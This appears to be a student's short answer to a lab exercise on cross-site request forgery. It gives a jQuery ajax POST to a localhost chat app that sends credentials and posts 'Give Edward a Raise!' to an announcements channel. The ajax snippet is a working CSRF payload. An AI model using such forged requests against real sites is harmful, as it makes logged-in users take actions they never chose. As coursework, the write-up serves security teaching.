Q5 : CSRF
I made the following ajax request:

$.ajax({
      url: 'http://localhost:8000/post',
      type: 'POST',
      data: {
        "channel": "#announcements",
        "message": "Give Edward a Raise!"
      },
      xhrFields: {
      withCredentials: true
   }
    });
    
it uses the CSRF vulnerability (suprisingly in my firefox, the same-site cookies were already disabled).

this is a normal ajax request, sending message to channel announcements when clicking on it.
